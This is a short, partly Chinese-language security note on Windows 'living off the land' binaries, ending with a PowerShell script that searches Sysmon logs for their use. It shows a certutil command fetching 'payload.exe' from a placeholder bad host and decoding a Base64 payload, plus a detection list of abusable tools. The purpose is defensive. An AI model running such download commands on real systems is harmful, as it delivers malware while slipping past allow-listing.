# LOLBins - Living Off The Land Binaries

All operating systems provide a rich toolbox to achieve multiple day-to-day tasks 
- like maintenance of the certificates, installation of patches and applications, management of files, and many more. 
- Those tools are installed by default and available to all users without specific access rights (most of the time). 
- as they are signed by the operating system, they are considered safe by default. 


The problem is the following: These tools are very powerful and provide interesting features for attackers. They are used for malicious purposes. Why reinvent the wheel if an attacker has access to a tool to achieve a specific task? Let's have a look at some tools available in every Microsoft Windows operating system. If you're using AppLocker, they are chances that you're allowing Microsoft signed binaries in your policy. 


## exe


Let's review some example:

`certutil.exe` 
- a tool used to work with certificates

```bash
# but it can also be used as a command-line browser to download some content from an URL:
C:\Temp> certutil.exe -urlcache -split -f "https://badsite.com/payload.exe" iambad.exe

# It can also be used to quickly decode a Base64-encoded payload:
C:\Temp> certutil -decode payload.txt payload.exe
```


I also mentioned several times in other diaries other looks like `msbuild.exe, csc.exe, or jsc.exe` that are provided by the `.NET Framework`. They are useful to compile code on the fly or to spawn other processes.


`ping.exe` 
- can be used in alternative ways. 

```bash
# By example to implement a pause in a script:
C:\Temp> ping -n 5 127.0.0.1
# Ping will send 5 ICMP request packets to the loopback interface, one per second. So, we introduce a pause of 5 seconds.
```



They are plenty of tools that could be potentially dangerous if invoked from an abnormal process (like word.exe or powershell.exe) or by a regular user. 

A nice list has been compiled and made available online: [The LOLBAS project](https://lolbas-project.github.io/)

### mshta.exe

mshta.exe `Microsoft HTML Application Host`
- mshta.exe is a part of Microsoft Windows Operating System which is needed to `execute .HTA files`. 
- This program is a non-essential system process, but should not be terminated unless suspected to be causing problems.
- mshta.exe 是存放在目录 C:\Windows\System32。 
- 已知的 Windows XP 文件大小为 45,568 字节 (占总出现比率 66% )，29,184 字节。
- 应用程序没有可视窗口。 总结在技术上威胁的危险度是 8% , 但是也可以参考 用户意见。

### netsh.exe
- 是一个管理员可以用来在命令提示符处配置并监视基于 Windows 的计算机的工具。
- 使用 `Netsh.exe` 工具，可以将输入的上下文命令定向到适当的帮助器，然后帮助器将执行命令。
- 帮助器是个动态链接库 `(.dll)` 文件，它通过提供配置、监视和支持一种或多种服务、实用工具或协议，来扩展 `Netsh.exe` 工具的功能。

## solution

track the usage of those tools via Sysmon and Powershell. 

example

```bash
# quick script to extract interesting Sysmon events: 

$lolbins = @("Atbroker.exe","Bash.exe","Bitsadmin.exe","Certutil.exe","Cmdkey.exe","Cmstp.exe","Control.exe","Csc.exe","Dfsvc.exe","Diskshadow.exe","Dnscmd.exe","Esentutl.exe","Eventvwr.exe","Expand.exe","Extexport.exe","Extrac32.exe","Findstr.exe","Forfiles.exe","Ftp.exe","Gpscript.exe","Hh.exe","Ie4uinit.exe","Ieexec.exe","Infdefaultinstall.exe","Installutil.exe","Makecab.exe","Mavinject.exe","Microsoft.Workflow.Compiler.exe","Mmc.exe","Msbuild.exe","Msconfig.exe","Msdt.exe","Mshta.exe","Msiexec.exe","Odbcconf.exe","Pcalua.exe","Pcwrun.exe","Presentationhost.exe","Print.exe","Reg.exe","Regasm.exe","Regedit.exe","Register-cimprovider.exe","Regsvcs.exe","Regsvr32.exe","Replace.exe","Rpcping.exe","Rundll32.exe","Runonce.exe","Runscripthelper.exe","Sc.exe","Schtasks.exe","Scriptrunner.exe","SyncAppvPublishingServer.exe","Verclsid.exe","Wab.exe","Wmic.exe","Wscript.exe","Xwizard.exe","Appvlp.exe","Bginfo.exe","Cdb.exe","csi.exe","dnx.exe","Dxcap.exe","Mftrace.exe","Msdeploy.exe","msxsl.exe","rcsi.exe","Sqldumper.exe","Sqlps.exe","SQLToolsPS.exe","te.exe","Tracker.exe","vsjitdebugger.exe")

Foreach($lolbin in $lolbins)
{
    Get-WinEvent -FilterHashtable @{logname="Microsoft-Windows-Sysmon/Operational";id=1;} | ?{ $_.message -match "`r`nImage: .*$lolbin`r`n" } | %{
        [regex]$regex = "(?i)`r`n(?<image>Image: .*$lolbin)`r`n(?<args>CommandLine: .*)`r`n"
        $match = $regex.Match($_.message)

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Binary' $lolbin
        $Out | Add-Member Noteproperty 'Image' $match.Groups["image"].value
        $Out | Add-Member Noteproperty 'Args' $match.Groups["args"].value
        $Out | fl
    }
}
```
